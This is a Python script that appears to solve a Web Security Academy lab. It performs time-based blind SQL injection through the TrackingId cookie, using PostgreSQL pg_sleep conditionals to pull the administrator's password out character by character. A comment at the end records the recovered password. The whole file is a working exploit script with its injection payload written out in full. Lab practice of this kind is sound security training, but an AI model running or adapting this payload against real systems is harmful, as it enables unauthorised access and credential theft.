import requests as rq
import string

url = "https://0a1500cb033c8f44c0f98be700d00088.web-security-academy.net/"
# headers = {
# 	"Cookie":"TrackingId=2lA0vNvUi2lGoTaG'%3BSELECT+CASE+WHEN+(SUBSTRING(password, 1, 1)>'a')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END FROM users WHERE username='administrator'--"
# }

leaked_data = list("")

while True:
	for ch in string.printable:
		position = len(leaked_data) + 1
		headers = {"Cookie" : f"TrackingId=2lA0vNvUi2lGoTaG'%3BSELECT+CASE+WHEN+(SUBSTRING(password, {position}, 1)='{ch}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--"}
		time = rq.get(url, headers=headers).elapsed.total_seconds()

		if time > 5:
			leaked_data.append(ch)
			break
		print("".join(leaked_data) + ch)

#Password : ocmn5e91cbsmkianzv8a